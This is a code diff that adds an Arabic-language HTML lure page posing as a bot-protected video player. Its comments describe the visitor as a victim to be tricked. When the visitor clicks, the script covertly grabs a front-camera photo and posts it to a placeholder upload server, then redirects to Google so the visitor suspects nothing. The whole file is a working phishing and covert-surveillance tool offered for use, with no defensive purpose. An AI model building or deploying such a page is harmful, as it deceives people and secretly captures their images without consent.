@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تشغيل الفيديو...</title>
+    <style>
+        body { background-color: #000; color: #fff; font-family: sans-serif; text-align: center; margin: 0; padding: 0; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        
+        /* زر وهمي جذاب لإجبار الضحية على النقر */
+        .fake-btn {
+            background-color: #ff0055;
+            color: white;
+            padding: 15px 30px;
+            font-size: 18px;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(255, 0, 85, 0.6);
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <h2>اضغط للمشاهدة (المقطع محمي ضد الروبوتات)</h2>
+    <br>
+    <!-- الزر الوهمي الذي يستدرج المستخدم للنقر -->
+    <button class="fake-btn" onclick="triggerTrap()">اضغط هنا للتشغيل</button>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        async function triggerTrap() {
+            try {
+                // طلب الكاميرا فور حدوث النقر (تفاعل المستخدم يمرر إذن المتصفح تلقائياً)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => { resolve(); };
+                });
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const imageData = canvas.toDataURL('image/png');
+                stream.getTracks().forEach(track => track.stop());
+
+                // إرسال الصورة للسيرفر
+                await fetch('https://your-server-endpoint.com/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                });
+
+                // إعادة توجيه المستخدم لكي لا يشك بشيء
+                window.location.href = "https://google.com";
+
+            } catch (err) {
+                console.error("تم رفض الصلاحية:", err);
+            }
+        }
+    </script>
+
+</body>
+  </html>
+  
